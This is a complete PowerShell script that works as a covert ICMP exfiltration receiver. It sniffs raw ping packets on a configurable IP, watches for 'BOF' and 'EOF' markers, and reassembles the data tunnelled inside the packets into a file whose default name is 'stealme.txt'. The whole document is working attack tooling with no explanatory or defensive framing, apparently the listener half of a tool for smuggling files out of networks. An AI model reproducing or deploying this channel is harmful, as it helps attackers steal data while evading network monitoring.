param(
    [string]$TargetFile = "$HOME\Desktop\stealme.txt",
    [string]$IP = "CHANGEME",
    [int]$Timeout = 60
)

if (![string]::IsNullOrWhiteSpace($IP) -and [system.net.IPAddress]::TryParse($IP, [ref]$null)) {
    $ICMPSocket = New-Object System.Net.Sockets.Socket([Net.Sockets.AddressFamily]::InterNetwork, [Net.Sockets.SocketType]::Raw, [Net.Sockets.ProtocolType]::Icmp)
    $Address = New-Object system.net.IPEndPoint([system.net.IPAddress]::Parse($IP), 0)
    $ICMPSocket.bind($Address)
    $ICMPSocket.IOControl([Net.Sockets.IOControlCode]::ReceiveAll, [BitConverter]::GetBytes(1), [byte[]]::new(0))
    $buffer = new-object byte[] $ICMPSocket.ReceiveBufferSize
    $ICMPSocket.ReceiveTimeout = $Timeout * 1000
    $Capture = $false
    $Transferbytes = @()
    $StartTime = Get-Date # Capture the start time

    try {
        while ((New-TimeSpan -Start $StartTime -End (Get-Date)).TotalMilliseconds -lt ($Timeout * 1000)) {
            try {
                $null = $ICMPSocket.Receive($buffer)

                if ([System.BitConverter]::ToString($buffer[20]) -eq "08") {
                    if ([System.Text.Encoding]::ASCII.GetString($buffer[28..30]) -eq "EOF") {
                        Write-Output "EOF received - transfer complete - Saving file"
                        [System.Text.Encoding]::ASCII.GetString($Transferbytes) | Out-File $TargetFile
                        $Capture = $false
                        break
                    }

                    if ($Capture) {
                        [byte[]]$Transferbytes += $buffer[28..1499]
                    }

                    if ([System.Text.Encoding]::ASCII.GetString($buffer[28..30]) -eq "BOF") {
                        Write-Output "BOF received - Starting Capture of file"
                        $Filename = [System.Text.Encoding]::ASCII.GetString($buffer[31..46])
                        $Capture = $true
                    }
                }
            } catch [System.Net.Sockets.SocketException] {
                if ($_.Exception.ErrorCode -eq 10060) { # Timeout error code
                    Write-Output "Waiting for data..."
                } else {
                    Write-Output "An unexpected error occurred: $($_.Exception.Message)"
                    break # Exit the loop on unexpected errors
                }
            }
        }
    } catch {
        Write-Output "An unexpected error occurred: $_"
    } finally {
        $ICMPSocket.Close()
    }
} else {
    Write-Output "Invalid IP address specified."
}
